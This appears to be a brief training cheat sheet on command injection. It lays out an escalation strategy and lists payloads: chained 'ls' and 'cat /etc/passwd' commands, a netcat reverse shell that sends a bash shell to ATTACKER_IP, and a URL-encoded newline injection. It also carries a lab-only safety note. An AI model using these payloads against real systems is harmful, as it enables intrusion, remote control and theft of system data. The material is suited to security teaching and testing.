Crafting Effective Command Injection Payloads

Practical examples for reconnaissance and control.

Key Idea

Command injection payloads range from simple information gathering (e.g., `ls`, `cat`) to advanced remote access techniques like reverse shells, often requiring OS-specific syntax and URL encoding.

Payload Strategy

Start with simple commands to confirm injection, then escalate to information gathering, and finally to remote code execution or reverse shells.

Safety Note

Always ensure you are in an authorized lab environment when attempting reverse shells or any form of system compromise. Unauthorized use is illegal.

Information Gathering (Linux)
127.0.0.1; ls -la /
127.0.0.1 && cat /etc/passwd
Reverse Shell (Linux)
127.0.0.1 | nc ATTACKER_IP 4444 -e /bin/bash
URL Encoded Payload
127.0.0.1%0auname -a
